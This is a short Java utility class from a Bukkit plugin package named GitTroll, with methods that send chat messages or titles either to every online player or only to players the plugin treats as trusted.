package net.Lenni0451.GitTroll.utils;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.Lenni0451.GitTroll.GitTroll;

public class Logger {
	
	public static void broadcastGitMessage(final String message) {
		for(Player player : Bukkit.getOnlinePlayers()) {
			if(GitTroll.getInstance().isPlayerTrusted(player)) {
				CustomPlayer.instanceOf(player).sendGitMessage(message);
			}
		}
	}
	
	public static void broadcastGitTitle(final String title, final String subtitle) {
		for(Player player : Bukkit.getOnlinePlayers()) {
			if(GitTroll.getInstance().isPlayerTrusted(player)) {
				CustomPlayer customPlayer = CustomPlayer.instanceOf(player);
				customPlayer.sendTitle(title, subtitle);
			}
		}
	}

	public static void broadcast(final String message) {
		for(Player player : Bukkit.getOnlinePlayers()) {
			player.sendMessage(message);
		}
	}
	
}
